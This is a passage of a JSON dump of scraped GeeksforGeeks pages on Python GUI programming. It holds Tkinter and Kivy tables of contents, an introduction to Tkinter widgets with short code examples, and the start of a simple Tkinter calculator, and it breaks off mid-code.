scrollbar Widget in TkinterToplevel WidgetsToplevel WidgetAskopenfile Dialog in TkinterAsksaveasfile Dialog in TkinterAskquestion Dialog in TkinterMessageBox WidgetCreate a Yes/No Message BoxChange the size of MessageBoxDifferent types of MessageBox in TkinterChange Icon for Tkinter MessageBoxChoose color DialogPopup Menu in TkinterGeometry ManagementPlace() method in TkinterGrid() method in TkinterGet the location and total number of grids in TkinterPack() method in TkinterUnmap any widget from the screen or toplevelPanedWindow Widget in TkinterSet the dimensions of the Tkinter windowSetting the position of TKinter labelsBinding FunctionsBinding function in TkinterBinding Function with double click with Tkinter ListBoxRight Click menu using TkinterWorking with Images in TkinterReading Images With Python \u2013 TkinterSet the titlebar icon of any tkinter/toplevel windowLoading Images in Tkinter using PILTkinter AdvanceGetting screen\u2019s height and width using TkinterHow to dynamically change text of CheckbuttonSet the focus on the desired widgetSearch String in TextAutocmplete ComboBox in Python-TkinterAutohiding ScrollbarsValidating Entry WidgetTracing Tkinter variables in PythonSetting and retrieving values of Tkinter variableAdding style to the input text using ttk.Entry widgetAfter method in TkinterDestroy widgets in TkinterText detection using PythonCheck whether the specified widget is visible or notCollapsible Pane in TkinterCreating a multiple Selection using TkinterCreating Tabbed Widget With Python-TkinterOpen a new Window with a button in Python-TkinterCryptography GUI using pythonApplications and ProjectsSimple GUI calculator using TkinterCreate Table Using TkinterGUI Calendar using TkinterFile Explorer in Python using TkinterToDo GUI Application using TkinterWeight Conversion GUI using TkinterAge Calculator using TkinterCreate a GUI Marksheet using TkinterLoan calculator using TkinterCreate a digital clock using TkinterMake Notepad using TkinterColor game using Tkinter in PythonSimple FLAMES game using TkinterSimple registration form using TkinterHow to create a COVID19 Data Representation GUI?\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3c5aafe221b0f8a4fe799d637004ec0e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Kivy is a graphical user interface opensource Python library that allows you to develop multi-platform applications on Windows, macOS, Android, iOS, Linux, and Raspberry-Pi. In addition to the regular mouse and keyboard inputs, it also supports multitouch events. The applications made using Kivy will similar across all the platforms but it also means that the applications fell or look will differ from any native application.Table Of Content \u2013Getting StartedWidgetsButtonsLayoutsThe kv Design Language (.kv file tutorial)WidgetsButtonsLayoutsApplications and ProjectsRecent Articles on Kivy !!Getting StartedWhat is Kivy?Kivy Introduction & InstallationHello World in KivyWidgetsLabel Widget in KivyTextinput widget in kivyCanvas in kivyLine (Canvas) in kivyCheckbox widget in KivyDropdown list in kivyWindow size Adjustment in KivyScrollview widget in kivyCarousel Widget In KivyBoxLayout widget in KivySlider widget in KivyAdd image widget in KivyPopup widget in KivySwitch widget in KivySpinner widget in kivyProgress Bar widget in kivyBubble in kivyTabbed panel in kivyScatter in kivyHow to use multiple UX Widgets in kivyAnimation in KivyButtonsWorking with buttons in KivyButton Action in KivyChange button Color in KivyChange the size and position of button in KivyPython \u2013 Rounding button corners in kivyDisable Kivy ButtonText Input box with a verification button in kivyUse image as a button in kivyLayoutsFloat Layout in KivyGridLayouts in KivyStackLayout in KivyAnchorLayout in KivyRelative Layout in KivyPageLayout in KivyLayouts in layouts (Multiple Layouts) in KivyThe kv Design Language (.kv file tutorial)WidgetsKivy .kv FileCreate Box Layout widget using .kv fileCanvas in Kivy using .kv fileTextInput in kivy using .kv fileCreate checkbox using .kv filePython | Drop-down list in kivy using .kv fileDrop-down list in kivy using .kv fileSwitch widget in Kivy using .kv fileSpinner widget in Kivy using .kv filePopup widget in Kivy using .kv fileCarousel Widget In Kivy using .kv fileSlider widget using .kv fileProgressbar widget in kivy using .kv fileRecycleView in KivyAdding image in Kivy using .kv fileSet Background Template in kivyScreenManager in Kivy using .kv fileAnimation in Kivy using .kv fileButtonsPython | Working with buttons in Kivy with .kv filePython \u2013 Change button color in kivy using .kv filePython \u2013 Change kivy button size and position using kv fileToggle button in kivy using .kv fileAdd image button using .kv file in kivyPython \u2013 Rounding button corners in kivy using .kv fileDisable kivy button using .kv fileFloating Action type button in kivy \u2013 PythonAnimated Floating Action Button in kivy \u2013 PythonText Input box with a verification button in kivy (using .kv file)Circular (Oval like) button using canvas in kivy (using .kv file)LayoutsGrid Layout in Kivy without .kv fileStackLayout in Kivy using .kv fileFloatLayout in Kivy using .kv fileAnchorLayout in Kivy using .kv fileRelative Layout in Kivy using .kv filePageLayout in Kivy using .kv fileApplications and ProjectsEllipse (different polygons) in KivyMake a simple window using kivyVkeyboard (virtual keyboard) in kivyMultiple Sliders widgets Controlling Background Screen or WindowColor in KivyHow to use Multiple kv files in kivyAccordion in kivyAccordion in kivy using .kv fileCreating a Simple Drawing App in kivyFile chooser in kivyMake a calculator using kivyCreate a stopwatch using clock object in kivy using .kv fileCreate a stopwatch Using Clock Object in kivy\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "00b6888ae3ab734815453989c4cd5fad",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python offers multiple options for developing GUI (Graphical User Interface). Out of all the GUI methods, tkinter is the most commonly used method. It is a standard Python interface to the Tk GUI toolkit shipped with Python. Python with tkinter is the fastest and easiest way to create the GUI applications. Creating a GUI using tkinter is an easy task.To create a tkinter app:Importing the module \u2013 tkinterCreate the main window (container)Add any number of widgets to the main windowApply the event Trigger on the widgets.Importing tkinter is same as importing any other module in the Python code. Note that the name of the module in Python 2.x is \u2018Tkinter\u2019 and in Python 3.x it is \u2018tkinter\u2019.import tkinter\r\nThere are two main methods used which the user needs to remember while creating the Python application with GUI.Tk(screenName=None, \u00a0baseName=None, \u00a0className=\u2019Tk\u2019, \u00a0useTk=1): To create a main window, tkinter offers a method \u2018Tk(screenName=None, \u00a0baseName=None, \u00a0className=\u2019Tk\u2019, \u00a0useTk=1)\u2019. To change the name of the window, you can change the className to the desired one. The basic code used to create the main window of the application is:m=tkinter.Tk() where m is the name of the main window objectmainloop(): There is a method known by the name mainloop() is used when your application is ready to run. mainloop() is an infinite loop used to run the application, wait for an event to occur and process the event as long as the window is not closed.m.mainloop()import tkinterm = tkinter.Tk()'''widgets are added here'''m.mainloop()tkinter also offers access to the geometric configuration of the widgets which can organize the widgets in the parent windows. There are mainly three geometry manager classes class.pack() method:It organizes the widgets in blocks before placing in the parent widget.grid() method:It organizes the widgets in grid (table-like structure) before placing in the parent widget.place() method:It organizes the widgets by placing them on specific positions directed by the programmer.There are a number of widgets which you can put in your tkinter application. Some of the major widgets are explained below:Button:To add a button in your application, this widget is used.The general syntax is:w=Button(master, option=value)master is the parameter used to represent the parent window.There are number of options which are used to change the format of the Buttons. Number of options can be passed as parameters separated by commas. Some of them are listed below.activebackground: to set the background color when button is under the cursor.activeforeground: to set the foreground color when button is under the cursor.bg: to set he normal background color.command: to call a function.font: to set the font on the button label.image: to set the image on the button.width: to set the width of the button.height: to set the height of the button.import tkinter as tkr = tk.Tk()r.title('Counting Seconds')button = tk.Button(r, text='Stop', width=25, command=r.destroy)button.pack()r.mainloop()Output:Canvas: It is used to draw pictures and other complex layout like graphics, text and widgets.The general syntax is:w = Canvas(master, option=value)\r\nmaster is the parameter used to represent the parent window.There are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.bd: to set the border width in pixels.bg: to set the normal background color.cursor: to set the cursor used in the canvas.highlightcolor: to set the color shown in the focus highlight.width: to set the width of the widget.height: to set the height of the widget.from tkinter import *master = Tk()w = Canvas(master, width=40, height=60)w.pack()canvas_height=20canvas_width=200y = int(canvas_height / 2)w.create_line(0, y, canvas_width, y )mainloop()Output:CheckButton: To select any number of options by displaying a number of options to a user as toggle buttons. The general syntax is:w = CheckButton(master, option=value)There are number of options which are used to change the format of this widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.Title: To set the title of the widget.activebackground: to set the background color when widget is under the cursor.activeforeground: to set the foreground color when widget is under the cursor.bg: to set he normal backgrouSteganographyBreakSecret Code:Attach a File:nd color.command: to call a function.font: to set the font on the button label.image: to set the image on the widget.from tkinter import *master = Tk()var1 = IntVar()Checkbutton(master, text='male', variable=var1).grid(row=0, sticky=W)var2 = IntVar()Checkbutton(master, text='female', variable=var2).grid(row=1, sticky=W)mainloop()Output:Entry:It is used to input the single line text entry from the user.. For multi-line text input, Text widget is used.The general syntax is:w=Entry(master, option=value)\r\nmaster is the parameter used to represent the parent window.There are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.bd: to set the border width in pixels.bg: to set the normal background color.cursor: to set the cursor used.command: to call a function.highlightcolor: to set the color shown in the focus highlight.width: to set the width of the button.height: to set the height of the button.from tkinter import *master = Tk()Label(master, text='First Name').grid(row=0)Label(master, text='Last Name').grid(row=1)e1 = Entry(master)e2 = Entry(master)e1.grid(row=0, column=1)e2.grid(row=1, column=1)mainloop()Output:Frame: It acts as a container to hold the widgets. It is used for grouping and organizing the widgets. The general syntax is:w = Frame(master, option=value)\r\nmaster is the parameter used to represent the parent window.There are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.highlightcolor: To set the color of the focus highlight when widget has to be focused.bd: to set the border width in pixels.bg: to set the normal background color.cursor: to set the cursor used.width: to set the width of the widget.height: to set the height of the widget.from tkinter import *\u00a0\u00a0root = Tk()frame = Frame(root)frame.pack()bottomframe = Frame(root)bottomframe.pack( side = BOTTOM )redbutton = Button(frame, text = 'Red', fg ='red')redbutton.pack( side = LEFT)greenbutton = Button(frame, text = 'Brown', fg='brown')greenbutton.pack( side = LEFT )bluebutton = Button(frame, text ='Blue', fg ='blue')bluebutton.pack( side = LEFT )blackbutton = Button(bottomframe, text ='Black', fg ='black')blackbutton.pack( side = BOTTOM)root.mainloop()Output:Label: It refers to the display box where you can put any text or image which can be updated any time as per the code.The general syntax is:w=Label(master, option=value)\r\nmaster is the parameter used to represent the parent window.There are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.bg: to set he normal background color.bg to set he normal background color.command: to call a function.font: to set the font on the button label.image: to set the image on the button.width: to set the width of the button.height\u201d to set the height of the button.from tkinter import *root = Tk()w = Label(root, text='GeeksForGeeks.org!')w.pack()root.mainloop()Output:Listbox: It offers a list to the user from which the user can accept any number of options.The general syntax is:w = Listbox(master, option=value)\r\nmaster is the parameter used to represent the parent window.There are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.highlightcolor: To set the color of the focus highlight when widget has to be focused.bg: to set he normal background color.bd: to set the border width in pixels.font: to set the font on the button label.image: to set the image on the widget.width: to set the width of the widget.height: to set the height of the widget.from tkinter import *\u00a0\u00a0top = Tk()Lb = Listbox(top)Lb.insert(1, 'Python')Lb.insert(2, 'Java')Lb.insert(3, 'C++')Lb.insert(4, 'Any other')Lb.pack()top.mainloop()Output:MenuButton: It is a part of top-down menu which stays on the window all the time. Every menubutton has its own functionality. The general syntax is:w = MenuButton(master, option=value)\r\nmaster is the parameter used to represent the parent window.There are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.activebackground: To set the background when mouse is over the widget.activeforeground: To set the foreground when mouse is over the widget.bg: to set he normal background color.bd: to set the size of border around the indicator.cursor: To appear the cursor when the mouse over the menubutton.image: to set the image on the widget.width: to set the width of the widget.height: to set the height of the widget.highlightcolor: To set the color of the focus highlight when widget has to be focused.from tkinter import *\u00a0\u00a0top = Tk()mb =\u00a0 Menubutton ( top, text = &quot;GfG&quot;)mb.grid()mb.menu\u00a0 =\u00a0 Menu ( mb, tearoff = 0 )mb[&quot;menu&quot;]\u00a0 =\u00a0 mb.menucVar\u00a0 = IntVar()aVar = IntVar()mb.menu.add_checkbutton ( label ='Contact', variable = cVar )mb.menu.add_checkbutton ( label = 'About', variable = aVar )mb.pack()top.mainloop()Output:Menu: It is used to create all kinds of menus used by the application.The general syntax is:w = Menu(master, option=value)\r\nmaster is the parameter used to represent the parent window.There are number of options which are used to change the format of this widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.title: To set the title of the widget.activebackground: to set the background color when widget is under the cursor.activeforeground: to set the foreground color when widget is under the cursor.bg: to set he normal background color.command: to call a function.font: to set the font on the button label.image: to set the image on the widget.from tkinter import *\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0root = Tk()menu = Menu(root)root.config(menu=menu)filemenu = Menu(menu)menu.add_cascade(label='File', menu=filemenu)filemenu.add_command(label='New')filemenu.add_command(label='Open...')filemenu.add_separator()filemenu.add_command(label='Exit', command=root.quit)helpmenu = Menu(menu)menu.add_cascade(label='Help', menu=helpmenu)helpmenu.add_command(label='About')mainloop()Output:Message: It refers to the multi-line and non-editable text. It works same as that of Label.The general syntax is:w = Message(master, option=value)\r\nmaster is the parameter used to represent the parent window.\r\nThere are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.bd: to set the border around the indicator.bg: to set he normal background color.font: to set the font on the button label.image: to set the image on the widget.width: to set the width of the widget.height: to set the height of the widget.from tkinter import *main = Tk()ourMessage ='This is our Message'messageVar = Message(main, text = ourMessage)messageVar.config(bg='lightgreen')messageVar.pack( )main.mainloop( )Output:RadioButton: It is used to offer multi-choice option to the user. It offers several options to the user and the user has to choose one option.The general syntax is:w = RadioButton(master, option=value)\r\nThere are number of options which are used to change the format of this widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.activebackground: to set the background color when widget is under the cursor.activeforeground: to set the foreground color when widget is under the cursor.bg: to set he normal background color.command: to call a function.font: to set the font on the button label.image: to set the image on the widget.width: to set the width of the label in characters.height: to set the height of the label in characters.from tkinter import *root = Tk()v = IntVar()Radiobutton(root, text='GfG', variable=v, value=1).pack(anchor=W)Radiobutton(root, text='MIT', variable=v, value=2).pack(anchor=W)mainloop()Output:Scale: It is used to provide a graphical slider that allows to select any value from that scale. The general syntax is:w = Scale(master, option=value)\r\nmaster is the parameter used to represent the parent window.\r\nThere are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.cursor: To change the cursor pattern when the mouse is over the widget.activebackground: To set the background of the widget when mouse is over the widget.bg: to set he normal background color.orient: Set it to HORIZONTAL or VERTICAL according to the requirement.from_: To set the value of one end of the scale range.to: To set the value of the other end of the scale range.image: to set the image on the widget.width: to set the width of the widget.from tkinter import *master = Tk()w = Scale(master, from_=0, to=42)w.pack()w = Scale(master, from_=0, to=200, orient=HORIZONTAL)w.pack()mainloop()Output:Scrollbar: It refers to the slide controller which will be used to implement listed widgets.The general syntax is:w = Scrollbar(master, option=value)\r\nmaster is the parameter used to represent the parent window.\r\nThere are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.width: to set the width of the widget.activebackground: To set the background when mouse is over the widget.bg: to set he normal background color.bd: to set the size of border around the indicator.cursor: To appear the cursor when the mouse over the menubutton.from tkinter import *root = Tk()scrollbar = Scrollbar(root)scrollbar.pack( side = RIGHT, fill = Y )mylist = Listbox(root, yscrollcommand = scrollbar.set )for line in range(100):\u00a0\u00a0\u00a0mylist.insert(END, 'This is line number' + str(line))mylist.pack( side = LEFT, fill = BOTH )scrollbar.config( command = mylist.yview )mainloop()Output:Text: To edit a multi-line text and format the way it has to be displayed.The general syntax is:w  =Text(master, option=value)\r\nThere are number of options which are used to change the format of the text. Number of options can be passed as parameters separated by commas. Some of them are listed below.highlightcolor: To set the color of the focus highlight when widget has to be focused.insertbackground: To set the background of the widget.bg: to set he normal background color.font: to set the font on the button label.image: to set the image on the widget.width: to set the width of the widget.height: to set the height of the widget.from tkinter import *root = Tk()T = Text(root, height=2, width=30)T.pack()T.insert(END, 'GeeksforGeeks\\nBEST WEBSITE\\n')mainloop()Output:TopLevel: This widget is directly controlled by the window manager. It don\u2019t need any parent window to work on.The general syntax is:w = TopLevel(master, option=value)\r\nThere are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.bg: to set he normal background color.bd: to set the size of border around the indicator.cursor: To appear the cursor when the mouse over the menubutton.width: to set the width of the widget.height: to set the height of the widget.from tkinter import *root = Tk()root.title('GfG')top = Toplevel()top.title('Python')top.mainloop()Output:SpinBox: It is an entry of \u2018Entry\u2019 widget. Here, value can be input by selecting a fixed value of numbers.The general syntax is:w = SpinBox(master, option=value)\r\nThere are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.bg: to set he normal background color.bd: to set the size of border around the indicator.cursor: To appear the cursor when the mouse over the menubutton.command: To call a function.width: to set the width of the widget.activebackground: To set the background when mouse is over the widget.disabledbackground: To disable the background when mouse is over the widget.from_: To set the value of one end of the range.to: To set the value of the other end of the range.from tkinter import *master = Tk()w = Spinbox(master, from_ = 0, to = 10)w.pack()mainloop()Output:PannedWindowIt is a container widget which is used to handle number of panes arranged in it. The general syntax is:w = PannedWindow(master, option=value)\r\nmaster is the parameter used to represent the parent window.There are number of options which are used to change the format of the widget. Number of options can be passed as parameters separated by commas. Some of them are listed below.bg: to set he normal background color.bd: to set the size of border around the indicator.cursor: To appear the cursor when the mouse over the menubutton.width: to set the width of the widget.height: to set the height of the widget.from tkinter import *m1 = PanedWindow()m1.pack(fill = BOTH, expand = 1)left = Entry(m1, bd = 5)m1.add(left)m2 = PanedWindow(m1, orient = VERTICAL)m1.add(m2)top = Scale( m2, orient = HORIZONTAL)m2.add(top)mainloop()Output:This article is contributed by Rishabh Bansal. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7959684559273e18d8a42158b6f5050a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite : Tkinter Introduction, lambda function\u00a0Python offers multiple options for developing a GUI (Graphical User Interface). Out of all the GUI methods, Tkinter is the most commonly used method. It is a standard Python interface to the Tk GUI toolkit shipped with Python. Python with Tkinter outputs the fastest and easiest way to create GUI applications. Creating a GUI using Tkinter is an easy task.\u00a0To create a Tkinter :\u00a0Importing the module \u2013 tkinterCreate the main window (container)Add any number of widgets to the main windowApply the event Trigger on the widgets.Below is what the GUI looks like:Let\u2019s create a GUI based simple calculator using the Python Tkinter module, which can perform basic arithmetic operations addition, subtraction, multiplication, and division.Below is the implementation :\u00a0\u00a0Python3# Python program to create a simple GUI# calculator using Tkinter\u00a0# import everything from tkinter modulefrom tkinter import *\u00a0# globally declare the expression variableexpression = \"\"\u00a0\u00a0# Function to update expression# in the text entry boxdef press(num):\u00a0\u00a0\u00a0\u00a0# point out the global expression variable\u00a0\u00a0\u00a0\u00a0global expression\u00a0\u00a0\u00a0\u00a0\u00a0# concatenation of string\u00a0\u00a0\u00a0\u00a0expression = expression + str(num)\u00a0\u00a0\u00a0\u00a0\u00a0# update the expression by using set method\u00a0\u00a0\u00a0\u00a0equation.set(expression)\u00a0\u00a0# Function to evaluate the final expressiondef equalpress():\u00a0\u00a0\u00a0\u00a0# Try and except statement is used\u00a0\u00a0\u00a0\u00a0# for handling the errors like zero\u00a0\u00a0\u00a0\u00a0# division error etc.\u00a0\u00a0\u00a0\u00a0\u00a0# Put that code inside the try block\u00a0\u00a0\u00a0\u00a0# which may generate the error\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0global expression\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# eval function evaluate the expression\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# and str function convert the result\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# into string\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0total = str(eval(expression))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0equation.set(total)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# initialize the expression variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# by empty string\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0expression = \"\"\u00a0\u00a0\u00a0\u00a0\u00a0# if error is generate then handle\u00a0\u00a0\u00a0\u00a0# by the except block\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0equation.set(\" error \")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0expression = \"\"\u00a0\u00a0# Function to clear the contents# of text entry boxdef clear():\u00a0\u00a0\u00a0\u00a0global expression\u00a0\u00a0\u00a0\u00a0expression = \"\"\u00a0\u00a0\u00a0\u00a0equation.set(\"\")\u00a0\u00a0# Driver codeif __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0# create a GUI window\u00a0\u00a0\u00a0\u00a0gui = Tk()\u00a0\u00a0\u00a0\u00a0\u00a0# set the background colour of GUI window\u00a0\u00a0\u00a0\u00a0gui.configure(background=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# set the title of GUI window\u00a0\u00a0\u00a0\u00a0gui.title(\"Simple Calculator\")\u00a0\u00a0\u00a0\u00a0\u00a0# set the configuration of GUI window\u00a0\u00a0\u00a0\u00a0gui.geometry(\"270x150\")\u00a0\u00a0\u00a0\u00a0\u00a0# StringVar() is the variable class\u00a0\u00a0\u00a0\u00a0# we create an instance of this class\u00a0\u00a0\u00a0\u00a0equation = StringVar()\u00a0\u00a0\u00a0\u00a0\u00a0# create the text entry box for\u00a0\u00a0\u00a0\u00a0# showing the expression .\u00a0\u00a0\u00a0\u00a0expression_field = Entry(gui, textvariable=equation)\u00a0\u00a0\u00a0\u00a0\u00a0# grid method is used for placing\u00a0\u00a0\u00a0\u00a0# the widgets at respective positions\u00a0\u00a0\u00a0\u00a0# in table like structure .\u00a0\u00a0\u00a0\u00a0expression_field.grid(columnspan=4, ipadx=70)\u00a0\u00a0\u00a0\u00a0\u00a0# create a Buttons and place at a particular\u00a0\u00a0\u00a0\u00a0# location inside the root window .\u00a0\u00a0\u00a0\u00a0# when user press the button, the command or\u00a0\u00a0\u00a0\u00a0# function affiliated to that button is executed .\u00a0\u00a0\u00a0\u00a0button1 = Button(gui, text=' 1 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(1), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button1.grid(row=2, column=0)\u00a0\u00a0\u00a0\u00a0\u00a0button2 = Button(gui, text=' 2 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(2), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button2.grid(row=2, column=1)\u00a0\u00a0\u00a0\u00a0\u00a0button3 = Button(gui, text=' 3 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(3), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button3.grid(row=2, column=2)\u00a0\u00a0\u00a0\u00a0\u00a0button4 = Button(gui, text=' 4 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(4), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button4.grid(row=3, column=0)\u00a0\u00a0\u00a0\u00a0\u00a0button5 = Button(gui, text=' 5 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(5), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button5.grid(row=3, column=1)\u00a0\u00a0\u00a0\u00a0\u00a0button6 = Button(gui, text=' 6 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(6), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button6.grid(row=3, column=2)\u00a0\u00a0\u00a0\u00a0\u00a0button7 = Button(gui, text=' 7 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(7), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button7.grid(row=4, column=0)\u00a0\u00a0\u00a0\u00a0\u00a0button8 = Button(gui, text=' 8 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(8), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button8.grid(row=4, column=1)\u00a0\u00a0\u00a0\u00a0\u00a0button9 = Button(gui, text=' 9 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(9), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button9.grid(row=4, column=2)\u00a0\u00a0\u00a0\u00a0\u00a0button0 = Button(gui, text=' 0 ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(0), height=1, width=7)\u00a0\u00a0\u00a0\u00a0button0.grid(row=5, column=0)\u00a0\u00a0\u00a0\u00a0\u00a0plus = Button(gui, text=' + ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(\"+\"), height=1, width=7)\u00a0\u00a0\u00a0\u00a0plus.grid(row=2, column=3)\u00a0\u00a0\u00a0\u00a0\u00a0minus = Button(gui, text=' - ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(\"-\"), height=1, width=7)\u00a0\u00a0\u00a0\u00a0minus.grid(row=3, column=3)\u00a0\u00a0\u00a0\u00a0\u00a0multiply = Button(gui, text=' * ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(\"*\"), height=1, width=7)\u00a0\u00a0\u00a0\u00a0multiply.grid(row=4, column=3)\u00a0\u00a0\u00a0\u00a0\u00a0divide = Button(gui, text=' / ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press(\"/\"), height=1, width=7)\u00a0\u00a0\u00a0\u00a0divide.grid(row=5, column=3)\u00a0\u00a0\u00a0\u00a0\u00a0equal = Button(gui, text=' = ', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=equalpress, height=1, width=7)\u00a0\u00a0\u00a0\u00a0equal.grid(row=5, column=2)\u00a0\u00a0\u00a0\u00a0\u00a0clear = Button(gui, text='Clear', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=clear, height=1, width=7)\u00a0\u00a0\u00a0\u00a0clear.grid(row=5, column='1')\u00a0\u00a0\u00a0\u00a0\u00a0Decimal= Button(gui, text='.', fg='black', bg='red',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=lambda: press('.'), height=1, width=7)\u00a0\u00a0\u00a0\u00a0Decimal.grid(row=6, column=0)\u00a0\u00a0\u00a0\u00a0# start the 